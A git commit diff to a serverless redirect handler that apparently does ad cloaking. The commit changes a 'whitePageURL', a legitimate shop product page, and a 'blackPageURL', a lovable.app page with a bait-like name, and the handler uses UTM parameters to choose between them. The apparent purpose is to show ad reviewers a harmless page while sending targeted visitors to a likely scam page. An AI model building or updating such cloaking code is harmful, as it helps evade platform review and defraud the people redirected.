03024121f75bf8b18a002086a40a0b3ad21ba733
abdullahch3332 <abdullahch3332@gmail.com>
2025-11-01 05:49:56 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://shopmercimilo.com/collections/traditional-toys/products/heirloom-stuffed-animals-carthusian-cat";
-    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
+    const whitePageURL = "https://www.babyshop.de/Meal-Time/Food-Storage/Liewood-Carin-Lunchbox-Whale-blue-Sea-blue::57729.html";
+    const blackPageURL = "https://instentquzzz.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
